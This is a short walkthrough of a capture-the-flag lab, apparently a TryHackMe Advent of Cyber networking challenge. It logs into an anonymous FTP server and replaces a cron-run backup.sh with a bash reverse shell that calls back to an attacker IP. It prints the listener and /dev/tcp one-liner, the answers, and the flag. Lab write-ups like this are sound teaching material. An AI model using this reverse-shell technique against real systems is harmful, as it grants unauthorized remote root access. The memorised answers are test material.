# Day 9 - Anyone can be Santa! (Networking)

1. Question #1: Name the directory on the FTP server that has data accessible by the "anonymous" user. Run `ftp 10.10.42.118` and enter username `anonymous`. Run `ls` to find `public` has permissions `drwxrwxrwx` and is owned by `65534`.

2. Question #2: What script gets executed within this directory? `cd public` and `ls` to get `backup.sh`.

3. Question #3: What movie did Santa have on his Christmas shopping list? `get shoppinglist.txt` and in a local terminal run `cat shoppinglist.txt` to get `The Polar Express`.

4. Question #4: Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

    1. Start reverse shell listener with netcat (`nc -lvnp 45913`) or pwncat (`pwncat 0.0.0.0:45913`).

    2. Grab bash reverse shell from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) and configure it `bash -i >& /dev/tcp/10.9.215.103/45913 0>&1`.

    3. Create a file locally called `backup.sh` and paste in the reverse shell with a shebang of `#!/bin/bash`.

    4. Use ftp to copy the file with `put backup.sh` in the ftp terminal.

    5. Wait a minute for the cronjob to execute and run `cat /root/flag.txt` to get `THM{even_you_can_be_santa}`
